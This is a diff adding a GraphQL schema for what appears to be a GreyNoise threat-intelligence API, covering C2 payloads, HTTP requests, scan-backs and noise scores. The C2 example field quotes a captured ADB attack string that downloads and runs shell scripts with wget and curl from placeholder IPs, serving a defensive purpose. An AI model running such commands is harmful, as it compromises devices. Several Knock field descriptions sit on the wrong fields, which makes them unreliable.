@@ -1,0 +1,201 @@
+directive @goModel(
+	model: String
+	models: [String!]
+) on OBJECT | INPUT_OBJECT | SCALAR | ENUM | INTERFACE | UNION
+
+directive @goField(
+	forceResolver: Boolean
+	name: String
+) on INPUT_FIELD_DEFINITION | FIELD_DEFINITION
+
+directive @goTag(
+	key: String!
+	value: String
+) on INPUT_FIELD_DEFINITION | FIELD_DEFINITION
+
+directive @spectaql(options: [SpectaQLOption]) on QUERY | MUTATION | SUBSCRIPTION | FIELD | FRAGMENT_DEFINITION | FRAGMENT_SPREAD | INLINE_FRAGMENT | VARIABLE_DEFINITION | SCHEMA | SCALAR | OBJECT | FIELD_DEFINITION | ARGUMENT_DEFINITION | INTERFACE | UNION | ENUM | ENUM_VALUE | INPUT_OBJECT | INPUT_FIELD_DEFINITION
+input SpectaQLOption { key: String!, value: String! }
+
+type QueryInfo {
+  """
+  The total number of distinct results GreyNoise has available for this data type.
+  """
+  resultsAvailable: Int!
+  """
+  The current limit being applied on the response.
+  """
+  resultsLimit: Int!
+}
+
+type Query {
+	"""
+	Return the top 1% of C2s ranked by pervasiveness GreyNoise has observed over the previous 24 hours. This data may be up to 4.5 hours old. 
+	"""
+	topC2s: C2Result!
+	"""
+	Return the top 1% of HTTP requests ranked by pervasiveness GreyNoise has observed over the last 7 days. This data may be up to 4.5 hours old.
+	"""
+  topHTTPRequests: HTTPResult!
+	"""
+	Return the top 1% of IPs searched in GreyNoise ordered by the number of users observed over the last 7 days. This data may be up to 4.5 hours old.
+	and then the number of times it was requested. The '/' path has been removed as this is less useful in most contexts.
+	"""
+	topPopularIPs: PopularIPResult!
+	"""
+	Translate the input_text into usable GreyNoise GNQL queries.
+	"""
+	generateGNQL(input_text: String!): NoiseGPT!
+  """
+	Return the top 1% of Knock results by most recently seen that GreyNoise has scanned back over the last 7 days. This data may be up to 12 hours old.
+	This endpoint also supports a single IP as input to pull it's specific knock information.
+  """
+	topKnocks(ip: String): KnockResult!
+  """
+	Return the top 1% of ranked IPs by noise score over the previous 7 days of traffic along with their pervasiveness and diversity scores for each scored metric.
+  This endpoint also supports a single IP as input to pull it's specific noise rank information.
+	"""
+	noiseRank(ip: String): NoiseRankResult!
+}
+
+#### C2 ####
+
+type C2 {
+  """The source IP that sent the payload."""
+  source_ip: ID! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "1.2.3.4" }])
+  """The potential IPs used within this payload."""
+  c2_ips: [String]! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "[\"5.6.7.8\", \"9.10.11.12\"]" }])
+  """The potential C2 domains used within this payload."""
+  c2_domains: [String]! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "[\"example.com\"]" }])
+  """
+  The ASCII escaped payload observed by a GreyNoise Sensor containing content that appears
+  to communicate with a command and control server.
+  """
+  payload: String! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "CNXN\u0000\u0000\u0000\u0001\u0000\u0000\u0004\u0000\u001b\u0000\u0000\u0000M\n\u0000\u0000����host::features=cmd,shell_v2OPENX\u0001\u0000\u0000\u0000\u0000\u0000\u0000:\u0001\u0000\u0000�`\u0000\u0000����shell:cd /data/local/tmp/; busybox wget http://5.6.7.8/w.sh; sh w.sh; curl http://9.10.11.12/c.sh; sh c.sh; wget http://5.6.7.8/wget.sh; sh wget.sh; curl http://9.10.11.12/wget.sh; sh wget.sh; busybox wget http://5.6.7.8/wget.sh; sh wget.sh; busybox curl http://9.10.11.12/wget.sh; sh wget.sh\u0000" }])
+  hits: Int! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "183" }])
+  """
+  A score from 0 - 100 that indicates how widespread this payload was across the internet. 
+  A score of 0 indicates that less than 1% of they GreyNoise fleet saw this specific payload.
+  """
+  pervasiveness: Int! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "60" }])
+}
+
+type C2Result {
+  queryInfo: QueryInfo!
+  c2s: [C2!]! 
+}
+
+#### HTTP REQUESTS ####
+
+type HTTPRequest {
+  """The total number of source IPs that sent this HTTP request."""
+  source_ip_count: Int! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "10" }])
+  """The total number of times GreyNoise observed this HTTP request."""
+  request_count: Int! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "1949" }])
+  """
+  A score from 0 - 100 that indicates how widespread this payload was across the internet. 
+  A score of 0 indicates that less than 1% of they GreyNoise fleet saw this specific payload.
+  """
+  pervasiveness: Int! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "98" }])
+  """The HTTP Method used in the request."""
+  method: String! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "GET" }])
+  # The HTTP URI Path used in the request."""
+  path: String! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "/_stats" }])
+  """
+  The HTTP headers as a single "k:v,k:v" string used in this request.
+  """
+  request_headers: [String!]! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "[Connection:close, Accept-Encoding:gzip, User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36]" }])
+}
+
+type HTTPResult {
+  queryInfo: QueryInfo!
+  httpRequests: [HTTPRequest!]! 
+}
+
+#### Knockknock ####
+
+type Knock {
+  """ """
+  last_crawled: Time! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "2023-05-11T20:28:45Z" }])
+  """The approximate time that GreyNoise crawled this source_ip."""
+  last_seen: Time! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "2023-05-11T16:25:04Z" }])
+  """The last time GreyNoise observed traffic from the source_ip."""
+  source_ip: String! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "141.212.122.142" }])
+  """The IPv4 addresses that was observed by GreyNoise and scanned back."""
+  knock_port: Int! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "80" }])
+  """The HTTP/S port used to crawl the source_ip."""
+  title: String! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "Connection attempts" }])
+  """The HTTP title from the response."""
+  favicon_mmh3_32: Int! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "-1561873722" }])
+  """The base-64 encoded 128-bit Murmur3 hash of the favicon.ico."""
+  favicon_mmh3_128: String! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "gAt6r5W0xcNAH8HhOfwVpw==" }])
+  """The detected JARM hash of services running at the target port."""
+  jarm: String! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "07d14d16d21d21d07c42d41d00041d24a458a375eef0c576d23a7bab9a9fb1" }])
+  """The list of IPv4 addresses extracted from the HTTP request body."""
+  ips: [String!]! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "[\"141.212.120.0\", \"141.212.121.0\", \"141.212.122.0\", \"141.212.124.0\", \"141.212.125.0\", \"141.212.123.0\"]" }])
+  """The list of emails extracted from the HTTP request body."""
+  emails: [String!]! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "[\"scan-admin@umich.edu\"]" }])
+  """The list of HTTP links extracted from the HTTP request body."""
+  links: [String!]! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "[\"https://cse.engin.umich.edu\"]" }])
+  """Is this IP a known Tor exit node."""
+  tor_exit: Boolean! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "false" }])
+  """The list of response headers returned from the HTTP request."""
+  headers: String! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "{\"Accept-Ranges\":[\"bytes\"],\"Content-Length\":[\"364\"],\"Content-Type\":[\"text/html\"],\"Date\":[\"Fri, 12 May 2023 05:29:35 GMT\"],\"Etag\":[\"\\\"1428014595\\\"\"],\"Last-Modified\":[\"Tue, 02 Feb 2021 02:02:30 GMT\"],\"Server\":[\"lighttpd/1.4.55\"],\"X-Frame-Options\":[\"SAMEORIGIN\"]}" }])
+  """The list of applications that were detected in the HTTP response body and their associated versions if detected."""
+  apps: String! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "[{\"app_name\":\"lighttpd\",\"version\":\"1.4.55\"}]" }])
+}
+
+type KnockResult {
+  queryInfo: QueryInfo!
+  knock: [Knock!]! 
+}
+
+#### NoiseGPT ####
+
+type NoiseGPT {
+  """The input text that was provided for translation."""
+  input_text: String! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "show me results starting in Brazil and targeting the US and are on port 22." }])
+  """The GNQL queries generated."""
+  queries: [String]! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "[\"metadata.country_code:BR AND destination_country_code:US AND raw_data.scan.port:22\"]" }])
+}
+
+#### Popular IP ####
+
+type PopularIP {
+  """The IP that was searched by a collection of GreyNoise users."""
+  ip: String! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "1.2.3.4" }])
+  """The number of times this IP was requested by all users."""
+  request_count: Int! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "22314" }])
+  """The number of users that requested this IP."""
+  users_count: Int! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "475" }])
+}
+
+type PopularIPResult {
+  queryInfo: QueryInfo!
+  popularIPs: [PopularIP!]! 
+}
+
+#### Noise Rank ####
+
+type NoiseRank {
+  """The source IP that sent packets to a GreyNoise sensor."""
+  ip: String! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "1.2.3.4" }])
+  """An aggregate noise score from 0-100 that shows how noisy a given source IP is."""
+  noise_score: Int! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "89" }])
+  """A 5 category breakdown from very low, low, med, high, very high, that describes how many of the GreyNoise sensors observed this source IP."""
+  sensor_pervasiveness: String! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "very low" }])
+  """A 5 category breakdown from very low, low, med, high, very high, that describes how many of the destination countries observed this source IP."""
+  country_pervasiveness: String! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "low" }])
+  """A 5 category breakdown from very low, low, med, high, very high, that describes how many distinct payloads were seen from this source IP."""
+  payload_diversity: String! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "med" }])
+  """One of the following cat very low, low, med, high, very high, that describes how many distinct ports received packets from this source IP."""
+  port_diversity: String! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "high" }])
+  """A 5 category breakdown from very low, low, med, high, very high, that describes how many packets were seen overall from this source IP."""
+  request_rate: String! @goTag(key: "mapstructure") @spectaql(options: [{ key: "example", value: "very high" }])
+}
+
+type NoiseRankResult {
+  queryInfo: QueryInfo!
+  ips: [NoiseRank!]! 
+}
+
+scalar Time
